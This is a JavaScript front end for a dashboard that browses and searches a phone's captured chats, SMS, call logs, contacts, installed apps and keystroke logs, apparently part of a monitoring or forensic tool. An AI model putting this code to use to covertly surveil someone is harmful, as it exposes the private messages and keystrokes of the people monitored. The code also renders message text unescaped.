document.addEventListener('DOMContentLoaded', () => {
    initializeFeatherIcons();
    setupNavigation();
    setupSearch();
    loadInitialData();
    setupChatWindow();
    setupSmsWindow();
    setupUpload();
});

function initializeFeatherIcons() {
    if (typeof feather !== 'undefined') {
        feather.replace();
    } else {
        console.warn('Feather Icons not loaded');
    }
}

function setupNavigation() {
    const navItems = document.querySelectorAll('.sidebar ul li');
    const mainContent = document.querySelector('.main-content');

    navItems.forEach(item => {
        item.addEventListener('click', () => {
            const sectionId = item.getAttribute('data-section');
             if (sectionId) {
                navItems.forEach(li => li.classList.remove('active'));
                item.classList.add('active');
                navigateToSection(sectionId);
            }
        });
    });
}

function navigateToSection(sectionId) {
    document.querySelectorAll('.section').forEach(section => {
        section.style.display = 'none';
        section.classList.remove('active');
    });

    const targetSection = document.getElementById(sectionId);
    if (targetSection) {
        targetSection.style.display = 'block';
        targetSection.classList.add('active');
        loadSectionData(sectionId);
    } else {
        console.warn(`Section with id "${sectionId}" not found`);
    }
}

function setupSearch() {
    const searchInputs = ['search-chats', 'search-sms', 'search-keylogs', 'search-calls', 'search-contacts', 'search-apps'];
    searchInputs.forEach(inputId => {
        const searchInput = document.getElementById(inputId);
        if (searchInput) {
             searchInput.addEventListener('input', debounce(() => {
                const sectionId = searchInput.closest('.section').id;
                searchSection(sectionId);
            }, 300));
        }
    });
}

function loadInitialData() {
    loadSectionData('chats');
}

function setupChatWindow() {
    const chatList = document.getElementById('chat-list');
    const chatWindow = document.querySelector('.chat-window');
    const closeChatButton = document.querySelector('.close-chat');
    const chatsSection = document.getElementById('chats');

    if (chatList) {
        chatList.addEventListener('click', (event) => {
            const chatItem = event.target.closest('.chat-item');
            if (chatItem) {
                const contactName = chatItem.dataset.contactName;
                chatsSection.style.display = 'none';
                openChat(contactName);
            }
        });
    }

    if (closeChatButton) {
        closeChatButton.addEventListener('click', () => {
          chatsSection.style.display = 'block';
          chatWindow.classList.remove('visible');
        });
    }
}

function setupSmsWindow() {
    const smsList = document.getElementById('sms-list');
    const smsWindow = document.querySelector('.sms-window');
    const closeSmsButton = document.querySelector('.close-sms');
      const smsSection = document.getElementById('sms');

    if (smsList) {
        smsList.addEventListener('click', (event) => {
            const smsItem = event.target.closest('.sms-item');
            if (smsItem) {
                const contactName = smsItem.dataset.contactName;
                smsSection.style.display = 'none';
                openSms(contactName);
            }
        });
    }

    if (closeSmsButton) {
        closeSmsButton.addEventListener('click', () => {
          smsSection.style.display = 'block';
          smsWindow.classList.remove('visible');
        });
    }
}

async function openChat(contactName) {
    const chatWindow = document.querySelector('.chat-window');
    const chatWindowName = document.getElementById('chat-window-name');
    const chatMessagesContainer = document.getElementById('chat-messages');

    chatWindowName.textContent = contactName;
    chatMessagesContainer.innerHTML = '';

    try {
        const response = await fetch(`/chat/${contactName}`);
        if (!response.ok) {
            throw new Error('Failed to fetch chat messages');
        }
        const messages = await response.json();

        messages.forEach(message => {
             const messageElement = document.createElement('div');
                messageElement.classList.add('message-item');
                const formattedTime = formatTime(message.formatted_time);
                messageElement.innerHTML = `
                    <p class="message-text">${message.text}</p>
                    <span class="message-time">${formattedTime}</span>
                 `;
                if (message.sender === 'You') {
                  messageElement.classList.add('outgoing');
                 } else {
                   messageElement.classList.add('incoming');
                   }
                chatMessagesContainer.appendChild(messageElement);
           });

        chatMessagesContainer.scrollTop = chatMessagesContainer.scrollHeight;
        chatWindow.classList.add('visible');
    } catch (error) {
        console.error('Error opening chat:', error);
        chatMessagesContainer.innerHTML = '<p class="error">Error loading chat</p>';
    }
}

async function openSms(contactName) {
    const smsWindow = document.querySelector('.sms-window');
    const smsWindowName = document.getElementById('sms-window-name');
    const smsMessagesContainer = document.getElementById('sms-messages');

    smsWindowName.textContent = contactName;
    smsMessagesContainer.innerHTML = '';

    try {
        const response = await fetch(`/sms/${contactName}`);
        if (!response.ok) {
            throw new Error('Failed to fetch SMS messages');
        }
        const messages = await response.json();

      messages.forEach(message => {
            const messageElement = document.createElement('div');
            messageElement.classList.add('message-item');
             const formattedTime = formatTime(message.time);
             messageElement.innerHTML = `
                <p class="message-text">${message.text}</p>
                <span class="message-time">${formattedTime}</span>
                `;
            if (message.sms_type === 'sent') {
                messageElement.classList.add('outgoing');
            } else {
                messageElement.classList.add('incoming');
            }
            smsMessagesContainer.appendChild(messageElement);
        });

        smsMessagesContainer.scrollTop = smsMessagesContainer.scrollHeight;
        smsWindow.classList.add('visible');
    } catch (error) {
        console.error('Error opening SMS:', error);
        smsMessagesContainer.innerHTML = '<p class="error">Error loading SMS</p>';
    }
}

function formatTime(timeString) {
    try {
        const date = new Date(timeString);
         const formattedTime = date.toLocaleTimeString('en-US', {
            hour: 'numeric',
             minute: '2-digit',
             hour12: true,
           });
            return formattedTime;
    } catch (error) {
        console.error('Error formatting time:', error);
        return 'Invalid Date';
    }
}

function loadSectionData(sectionId) {
    switch (sectionId) {
         case 'chats':
            loadChats();
            break;
        case 'calls':
            loadCalls();
            break;
        case 'keylogs':
            loadKeylogs();
            break;
        case 'contacts':
            loadContacts();
            break;
        case 'sms':
            loadSms();
            break;
        case 'installed_apps':
            loadInstalledApps();
            break;
        default:
            console.warn(`No data loader for section: ${sectionId}`);
    }
}

async function searchSection(sectionId) {
    switch (sectionId) {
        case 'chats':
            searchChats();
            break;
        case 'calls':
            searchCalls();
            break;
        case 'keylogs':
            searchKeylogs();
            break;
        case 'contacts':
            searchContacts();
            break;
        case 'sms':
            searchSms();
            break;
        case 'installed_apps':
            searchApps();
            break;
        default:
            console.warn(`No search function for section: ${sectionId}`);
    }
}

async function searchChats() {
    const searchTerm = document.getElementById('search-chats').value;
    const resultsContainer = document.getElementById('search-results-chats');
    resultsContainer.innerHTML = '';

    if (searchTerm) {
        const response = await fetch('/search_chats', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `search_term=${encodeURIComponent(searchTerm)}`
        });

        if (response.ok) {
            const results = await response.json();
             if (results.length > 0) {
                results.forEach(result => {
                    const resultElement = document.createElement('div');
                    resultElement.classList.add('search-result-item');
                    resultElement.textContent = `${result.name}: ${result.text}`;
                    resultElement.addEventListener('click', () => {
                        openChat(result.name);
                    });
                    resultsContainer.appendChild(resultElement);
                });
            } else {
                resultsContainer.innerHTML = '<p>No results found</p>';
            }
        } else {
            console.error('Error during chat search:', response.status);
        }
    }
}

async function searchCalls() {
    const searchTerm = document.getElementById('search-calls').value;
    const resultsContainer = document.getElementById('search-results-calls');
    resultsContainer.innerHTML = '';

    if (searchTerm) {
        const response = await fetch('/search_calls', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `search_term=${encodeURIComponent(searchTerm)}`
        });

        if (response.ok) {
            const results = await response.json();
            displaySearchResults(results, resultsContainer, 'call');
        } else {
            console.error('Error during call search:', response.status);
        }
    }
}

async function searchKeylogs() {
    const searchTerm = document.getElementById('search-keylogs').value;
    const resultsContainer = document.getElementById('search-results-keylogs');
    resultsContainer.innerHTML = '';

    if (searchTerm) {
        const response = await fetch('/search_keylogs', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `search_term=${encodeURIComponent(searchTerm)}`
        });

        if (response.ok) {
            const results = await response.json();
            displaySearchResults(results, resultsContainer, 'keylog');
        } else {
            console.error('Error during keylog search:', response.status);
        }
    }
}

async function searchContacts() {
    const searchTerm = document.getElementById('search-contacts').value;
    const resultsContainer = document.getElementById('search-results-contacts');
    resultsContainer.innerHTML = '';

    if (searchTerm) {
        const response = await fetch('/search_contacts', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `search_term=${encodeURIComponent(searchTerm)}`
        });

        if (response.ok) {
            const results = await response.json();
            displaySearchResults(results, resultsContainer, 'contact');
        } else {
            console.error('Error during contact search:', response.status);
        }
    }
}

async function searchSms() {
    const searchTerm = document.getElementById('search-sms').value;
    const resultsContainer = document.getElementById('search-results-sms');
    resultsContainer.innerHTML = '';

    if (searchTerm) {
        const response = await fetch('/search_sms', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `search_term=${encodeURIComponent(searchTerm)}`
        });

        if (response.ok) {
            const results = await response.json();
            displaySearchResults(results, resultsContainer, 'sms');
        } else {
            console.error('Error during SMS search:', response.status);
        }
    }
}

async function searchApps() {
     const searchTerm = document.getElementById('search-apps').value;
    const resultsContainer = document.getElementById('search-results-apps');
    resultsContainer.innerHTML = '';

    if (searchTerm) {
        const response = await fetch('/search_apps', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `search_term=${encodeURIComponent(searchTerm)}`
        });

        if (response.ok) {
            const results = await response.json();
            displaySearchResults(results, resultsContainer, 'app');
        } else {
            console.error('Error during installed apps search:', response.status);
        }
    }
}

function displaySearchResults(results, container, type) {
    if (results.length > 0) {
         results.forEach(result => {
            const resultElement = document.createElement('div');
            resultElement.classList.add('search-result-item');
            switch (type) {
                case 'call':
                    resultElement.textContent = `${result.from_to}: ${result.call_type} - ${formatTime(result.time)}`;
                    break;
                case 'keylog':
                     resultElement.textContent = `${result.application}: ${result.text} - ${formatTime(result.time)}`;
                     break;
                 case 'contact':
                    resultElement.textContent = `${result.name}: ${result.phone_number || result.email_id}`;
                    break;
                case 'sms':
                    resultElement.textContent = `${result.from_to}: ${result.text} - ${formatTime(result.time)}`;
                      resultElement.addEventListener('click', () => {
                        openSms(result.from_to);
                    });
                    break;
                case 'app':
                      resultElement.textContent = `${result.application_name}: ${result.package_name}`;
                      break;
                  default:
                    resultElement.textContent = `${result.name}: ${result.text}`;
                    resultElement.addEventListener('click', () => {
                        openChat(result.name);
                    });
            }
            container.appendChild(resultElement);
        });
    } else {
        container.innerHTML = '<p>No results found</p>';
    }
}

async function loadChats() {
    const chatList = document.getElementById('chat-list');
    chatList.innerHTML = '';
    const response = await fetch('/get_chats');
    if (response.ok) {
        const chats = await response.json();
        chats.forEach(chat => {
            const chatItem = document.createElement('div');
            chatItem.classList.add('chat-item', 'card');
            chatItem.setAttribute('data-contact-name', chat.name);
              const initials = chat.name.substring(0, 1).toUpperCase();
            chatItem.innerHTML = `
                 <div class="profile-pic-placeholder">${initials}</div>
                <div class="chat-details">
                    <span class="name">${chat.name}</span>
                    <span class="preview">${chat.last_message ? chat.last_message.substring(0, 30) : ''}</span>
                </div>
                <span class="time">${formatTime(chat.time)}</span>
            `;
            chatItem.addEventListener('click', () => {
                openChat(chat.name);
            });
            chatList.appendChild(chatItem);
        });
    } else {
        console.error('Error loading chats:', response.status);
    }
}

async function loadCalls() {
    const callsList = document.getElementById('calls-list');
    callsList.innerHTML = '';
    const response = await fetch('/get_calls');
     if (response.ok) {
        const calls = await response.json();
         calls.forEach(call => {
            const callItem = document.createElement('div');
            callItem.classList.add('call-item', 'card');
            const initials = call.from_to.substring(0, 1).toUpperCase();
            callItem.innerHTML = `
                <div class="profile-pic-placeholder">${initials}</div>
                <div class="call-details">
                    <span class="name">${call.from_to}</span>
                    <span class="call-type">${call.call_type}</span>
                </div>
                <span class="time">${formatTime(call.time)}</span>
                 <span class="duration">${call.duration} seconds</span>
            `;
            callsList.appendChild(callItem);
        });
    } else {
        console.error('Error loading calls:', response.status);
    }
}

async function loadKeylogs() {
    const keylogsTable = document.querySelector('#keylogs-table tbody');
    keylogsTable.innerHTML = '';
    const response = await fetch('/get_keylogs');
     if (response.ok) {
        const keylogs = await response.json();
        keylogs.forEach(keylog => {
            const row = keylogsTable.insertRow();
            row.innerHTML = `
                <td>${keylog.application}</td>
                <td>${formatTime(keylog.time)}</td>
                <td>${keylog.text}</td>
            `;
        });
    } else {
        console.error('Error loading keylogs:', response.status);
    }
}

async function loadContacts() {
    const contactsList = document.getElementById('contacts-list');
    contactsList.innerHTML = '';
    const response = await fetch('/get_contacts');
     if (response.ok) {
        const contacts = await response.json();
         contacts.forEach(contact => {
            const contactItem = document.createElement('div');
            contactItem.classList.add('contact-item', 'card');
             const initials = contact.name.substring(0, 1).toUpperCase();
             contactItem.innerHTML = `
                  <div class="profile-pic-placeholder">${initials}</div>
                 <div class="contact-details">
                    <span class="name">${contact.name}</span>
                    <span class="phone">${contact.phone_number || ''}</span>
                    <span class="email">${contact.email_id || ''}</span>
                </div>
                <span class="last-contacted">${formatTime(contact.last_contacted_dt) || ''}</span>
            `;
            contactsList.appendChild(contactItem);
        });
    } else {
        console.error('Error loading contacts:', response.status);
    }
}

async function loadSms() {
    const smsList = document.getElementById('sms-list');
    smsList.innerHTML = '';
     const response = await fetch('/get_sms');
    if (response.ok) {
        const smsMessages = await response.json();
        smsMessages.forEach(sms => {
             const smsItem = document.createElement('div');
            smsItem.classList.add('sms-item', 'card');
             smsItem.setAttribute('data-contact-name', sms.from_to);
             const initials = sms.from_to.substring(0, 1).toUpperCase();
             smsItem.innerHTML = `
                <div class="profile-pic-placeholder">${initials}</div>
                <div class="sms-details">
                    <span class="name">${sms.from_to}</span>
                    <span class="preview">${sms.text.substring(0, 30)}</span>
                </div>
                <span class="time">${formatTime(sms.time)}</span>
            `;
             smsItem.addEventListener('click', () => {
                openSms(sms.from_to);
            });
            smsList.appendChild(smsItem);
        });
    } else {
        console.error('Error loading SMS messages:', response.status);
    }
}

async function loadInstalledApps() {
    const appsList = document.getElementById('apps-list');
    appsList.innerHTML = '';
    const response = await fetch('/get_installed_apps');
    if (response.ok) {
        const apps = await response.json();
        apps.forEach(app => {
             const appItem = document.createElement('div');
             appItem.classList.add('app-item', 'card');
             const initials = app.application_name.substring(0, 1).toUpperCase();
            appItem.innerHTML = `
                 <div class="app-icon-placeholder">${initials}</div>
                <div class="app-details">
                     <span class="name">${app.application_name}</span>
                   <span class="package-name">${app.package_name}</span>
                </div>
                <span class="install-date">${app.installed_date}</span>
            `;
             appsList.appendChild(appItem);
        });
    } else {
        console.error('Error loading installed apps:', response.status);
    }
}

function refreshData(sectionId) {
    loadSectionData(sectionId);
}

// Utility function for debouncing
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Setting up the upload functionality
function setupUpload() {
    const uploadIcon = document.querySelector('.upload-icon i');
    const uploadStatus = document.querySelector('.upload-status');
    const uploadProgress = document.getElementById('upload-progress');
    const uploadMessage = document.getElementById('upload-message');

    if (uploadIcon) {
        uploadIcon.addEventListener('click', () => {
            const fileInput = document.createElement('input');
            fileInput.type = 'file';
            fileInput.accept = '.csv, application/vnd.ms-excel, application/vnd.openxmlformats-officedocument.spreadsheetml.sheet';
            fileInput.addEventListener('change', async (event) => {
                const file = event.target.files[0];
                if (file) {
                    // Show progress bar and message
                    uploadProgress.style.display = 'block';
                    uploadMessage.textContent = 'Uploading...';

                    try {
                        await uploadFile(file, uploadProgress); // Pass progress element
                        uploadMessage.textContent = 'Upload Complete';
                        uploadProgress.style.display = 'none'; // Hide on completion
                        loadInitialData();
                    } catch (error) {
                        uploadMessage.textContent = 'Upload Failed';
                        console.error('Error uploading file:', error);
                    }
                }
            });
            fileInput.click();
        });
    }
}

async function uploadFile(file, uploadProgress) {
    const formData = new FormData();
    formData.append('file', file);

    // For progress tracking (optional):
    const xhr = new XMLHttpRequest();
    xhr.open('POST', '/upload');

    xhr.upload.onprogress = (event) => {
        if (event.lengthComputable) {
            const percentComplete = (event.loaded / event.total) * 100;
            uploadProgress.value = percentComplete;
        }
    };

    xhr.onload = () => {
        if (xhr.status >= 200 && xhr.status < 300) {
            console.log('File uploaded successfully');
        } else {
            console.error('Error uploading file:', xhr.statusText);
        }
    };

    xhr.onerror = () => {
        console.error('Error uploading file');
    };

    xhr.send(formData);
}